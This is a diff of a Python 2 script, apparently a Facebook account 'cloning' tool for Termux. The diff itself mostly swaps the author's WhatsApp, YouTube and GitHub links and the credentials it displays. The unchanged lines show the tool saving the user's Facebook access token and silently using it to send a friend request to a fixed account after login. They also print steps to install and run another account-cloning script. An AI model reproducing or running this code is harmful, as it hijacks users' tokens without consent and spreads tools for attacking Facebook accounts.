@@ -950,10 +950,10 @@ def pilih_login():
 	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
 	        login()
         elif peak =="5":
-		os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
+		os.system('xdg-open https://chat.whatsapp.com/LRwNT72vv2XGL1Up36WlVu')
 	        login()
         elif peak =="6":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCHNT-JPOilcepG3g5fCiqXQ ')
 	        login()
 	elif peak =="0":
 		keluar()
@@ -1005,7 +1005,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				os.system('xdg-open https://m.youtube.com/channel/UCHNT-JPOilcepG3g5fCiqXQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -1138,11 +1138,11 @@ def pilih():
                 jalan('\033[1;96mpkg install git')
                 jalan('\033[1;96mpip2 install requests')
                 jalan('\033[1;96mpip2 install mechanize') 
-                jalan("\033[1;96mgit clone https://github.com/lovehacker404/World")
+                jalan("\033[1;96mgit clone https://github.com/H4-D/World")
                 jalan('\033[1;96mcd World')
-                jalan('\033[1;96mpython2 Cloning.py')
-                jalan('\033[1;96mUser:Black')
-                jalan('\033[1;96mpass:Mafia')
+                jalan('\033[1;96mpython2 C3.py')
+                jalan('\033[1;96mUser:Amir')
+                jalan('\033[1;96mpass:Amir')
                 jalan('\033[1;92m👆Copy Command & send 2 groups👆')
                 jalan('\033[1;91mYoutube Chenal Like Subscrib plzz')
                 jalan('\033[1;92m⭕No2⭕')
@@ -1397,10 +1397,10 @@ def pilih():
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
         elif unikers =="7":
-		os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
+		os.system('xdg-open https://chat.whatsapp.com/LRwNT72vv2XGL1Up36WlVu')
 	        menu()
         elif unikers =="8":
-	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+	        os.system('xdg-open https://m.youtube.com/channel/UCHNT-JPOilcepG3g5fCiqXQ ')
 	        menu()
         elif unikers =="9":
 		tokenz()
